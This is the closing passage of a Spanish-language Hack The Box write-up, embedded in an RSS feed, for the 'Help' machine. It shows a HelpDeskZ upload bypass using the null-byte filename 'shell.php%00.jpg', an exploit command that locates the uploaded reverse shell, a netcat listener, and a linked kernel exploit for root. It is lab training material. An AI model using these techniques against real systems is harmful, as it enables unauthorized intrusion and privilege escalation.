&lt;p&gt;Ya que tenemos nuestra reverse shell debemos de tomar en cuenta que al ejecutar el exploit debemos de tener la misma hora del servidor en el que esta la plataforma. Obtuvimos la &amp;ldquo;hora del servidor&amp;rdquo; mediante la respuesta de un request en burpsuite, para luego utilizar esta &amp;ldquo;hora o timezone&amp;rdquo; en nuestra maquina.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/Screenshot_20190607_182031.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;helpdeskz---ticket&#34;&gt;HelpDeskZ - TICKET&lt;/h3&gt;
&lt;p&gt;Para crear un ticket nos dirigimos hacia &lt;code&gt;Submit Ticket&lt;/code&gt;, seleccionamos General y Siguiete.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/Screenshot_20190607_211711.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Luego de esto rellenamos los campos que sean obligatorios (*), agregamos nuestro archivo (&lt;code&gt;shell.php%00.jpg&lt;/code&gt;) y escribimos el captcha que nos muestra.&lt;/p&gt;
&lt;h3 id=&#34;exploit&#34;&gt;EXPLOIT&lt;/h3&gt;
&lt;p&gt;Cuando el archivo es subido ejecutamos nuestro exploit. Hay que mencionar que al exploit se le hicieron unos cambios, uno de ellos fue agregar un valor mas alto al rango y verbosidad.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;python exploit.py http://10.10.10.121/support/uploads/tickets/ shell.php
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/exploit-py.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Al encontrar nuestra reverse shell el exploit se congela y nos muestra la url.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/exploitpy-found.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h3 id=&#34;netcat&#34;&gt;NETCAT&lt;/h3&gt;
&lt;p&gt;Por otro lado nuestra terminal en escucha con netcat obtuvo una shell.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/shell-nc.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/user-txt_hide.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;privilege-escalation&#34;&gt;PRIVILEGE ESCALATION&lt;/h2&gt;
&lt;p&gt;Para escalar privilegios hicimos una pequeña enumeracion, entre ellas el kernel, encontramos que el kernel que esta usando la maquina es vulnerable a un exploit.&lt;/p&gt;
&lt;p&gt;Exploit: &lt;a href=&#34;https://www.exploit-db.com/exploits/44298&#34;&gt;https://www.exploit-db.com/exploits/44298&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/Screenshot_20190607_212300.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Compilamos y descargamos el exploit dentro de lamaquina, al ejecutarlo nos devuelve una shell con privilegios root.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/root-user-exploit.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;p&gt;Y nuestra flag &lt;code&gt;root.txt&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/help/root-flag_hide.webp&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
</content:encoded>
        <dc:creator>sckull</dc:creator>
        <media:content url="https://sckull.github.io/images/posts/htb/help/cover.webp" medium="image"><media:title type="html">featured image</media:title></media:content>
        
        <media:content url="https://sckull.github.io/images/posts/htb/help/cover.webp" medium="image"><media:title type="html">meta image</media:title></media:content>
        
          
            
              <category>linux</category>
            
          
        
        
          
            
              <category>hackthebox</category>
            
          
        
        
      </item>
      

    
  </channel>
</rss>